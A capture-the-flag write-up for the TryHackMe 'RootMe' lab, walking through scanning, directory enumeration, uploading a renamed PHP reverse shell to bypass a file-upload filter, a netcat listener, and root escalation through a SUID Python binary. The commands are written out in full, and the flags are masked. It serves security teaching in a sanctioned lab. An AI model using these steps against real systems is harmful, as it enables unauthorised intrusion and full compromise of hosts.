# TryHackMe – RootMe Writeup

## Overview

This room demonstrates practical **web exploitation and privilege escalation** techniques.  
The challenge involves discovering open services, exploiting a file upload vulnerability to gain a reverse shell, and escalating privileges to obtain the root flag.

---

# Lab Setup

Open the TryHackMe website:

https://tryhackme.com/

Steps:

1. Click **Practice**
2. Click **Challenges**
3. Search **RootMe**
4. Click **RootMe**
5. Click **Join Room**
6. Click **Start Machine**

Assume the target machine IP is:

```
10.49.145.33
```

---

# Connecting Kali to TryHackMe VPN

Access the machine and connect Kali Linux to the VPN.

```bash
cd /home/student/Downloads
sudo apt install openvpn
sudo openvpn <ovpn file path>
```

---

# Task 1: Deploy the Machine

Start the target machine from the TryHackMe interface.

---

# Task 2: Reconnaissance

## Q1: Scan the machine. How many ports are open?

Open Zenmap.

```bash
sudo zenmap
```

Steps:

- Select **Quick Scan Plus**
- Enter the **Target IP**
- Click **Scan**

Result:

Two ports were discovered open.

- SSH
- Apache HTTP Server

Answer

```
**
```

---

## Q2: What version of Apache is running?

The Apache version is identified during the scan.

Answer

```
**
```

---

## Q3: What service is running on port 22?

Port 22 corresponds to the SSH service.

Answer

```
**
```

---

## Q4: Find directories on the web server using Gobuster

Use the Gobuster tool to enumerate directories.

```bash
gobuster dir -u http://<Target_IP> -w /usr/share/dirbuster/wordlists/directory-list-lowercase-2.3-medium.txt
```

Result

```
**
```

Access the discovered directory:

```
http://<Target_IP>/panel/
```

This page contains a **file upload form**.

---

# Task 3: Getting a Shell

Goal: Upload a reverse shell to gain access to the target machine.

---

## Step 1: Download PHP Reverse Shell

Search for **PHP reverse shell pentestmonkey**.

Download the reverse shell from:

https://pentestmonkey.net/tools/web-shells/php-reverse-shell

Download using:

```bash
cd /home/student/Downloads
wget http://pentestmonkey.net/tools/php-reverse-shell/php-reverse-shell-1.0.tar.gz
```

---

## Step 2: Extract the archive

```bash
tar -xvf php-reverse-shell-1.0.tar.gz
cd php-reverse-shell-1.0
```

---

## Step 3: Modify reverse shell

Open the PHP file.

```bash
vim php-reverse-shell.php
```

Edit the following values:

- Attacker IP → Kali machine **tun0 IP**
- Listening port

Check tun0 IP using:

```bash
ifconfig
```

Save and exit.

---

## Step 4: Rename the shell

Rename the file to bypass upload restrictions.

```bash
cp php-reverse-shell.php revphp.phtml
```

---

## Step 5: Upload the shell

Upload the file to:

```
http://<Target_IP>/panel
```

After uploading, access the shell from:

```
http://<Target_IP>/uploads
```

---

## Step 6: Start Netcat Listener

Before triggering the shell, start a listener.

```bash
nc -lvnp 1234
```

Once the uploaded file is executed, a reverse shell connection will be established.

---

## Step 7: Upgrade to Interactive Shell

Use Python to spawn a proper shell.

```bash
python -c 'import pty; pty.spawn("/bin/bash")'
```

Navigate to the home directory.

```bash
cd ~
ls
cat user.txt
```

Answer

```
**
```

---

# Task 4: Privilege Escalation

## Q1: Search for files with SUID permission

Use the following command to locate SUID binaries.

```bash
find / -user root -perm /4000
```

Result shows a suspicious binary.

Answer

```
**
```

---

## Q2: Escalate privileges using GTFOBins

Open:

https://gtfobins.github.io/

Search for **Python**.

Under the **SUID** section use the following command.

```bash
cd /usr/bin
./python -c 'import os; os.execl("/bin/sh", "sh", "-p")'
```

You now obtain a **root shell**.

---

## Retrieve Root Flag

Navigate to the root directory.

```bash
cd /root
ls
cat root.txt
```

Answer

```
**
```

---

# Conclusion

This lab demonstrates several important penetration testing concepts:

- Network reconnaissance using Nmap
- Web directory enumeration using Gobuster
- Exploiting insecure file upload functionality
- Establishing reverse shells
- Privilege escalation using SUID binaries
- Using GTFOBins for exploitation techniques

---

# Disclaimer

This writeup is for **educational purposes only**.  
Sensitive flags and answers have been intentionally hidden to respect the learning platform's policies.